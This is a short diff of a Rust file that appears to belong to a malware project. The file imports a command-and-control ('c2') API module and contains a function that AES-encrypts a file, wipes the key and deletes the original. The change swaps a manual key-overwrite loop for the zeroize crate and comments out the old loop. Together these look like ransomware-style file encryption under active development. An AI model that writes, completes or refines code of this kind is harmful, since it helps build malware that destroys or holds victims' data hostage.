@@ -20,6 +20,8 @@ use std::{
     thread::{self, JoinHandle},
 };
 
+use zeroize::Zeroize;
+
 use crate::c2::api::C2API;
 
 fn aes_256_ctr_encrypt_decrypt(ctext: &mut [u8], key: &[u8], nonce: &[u8]) -> Result<(), FmtError> {
@@ -222,12 +224,17 @@ pub fn encrypt_decrypt_file(
 
     drop(file_dst);
     drop(file_src);
-
+    
     unsafe {
+        key.as_mut_vec().zeroize();
+    }
+    
+
+    /* unsafe {
         for key_char in key.as_mut_vec() {
             *key_char = 48;
         }
-    }
+    } */
 
     match remove_file(file_src_path) {
         Ok(_) => (),
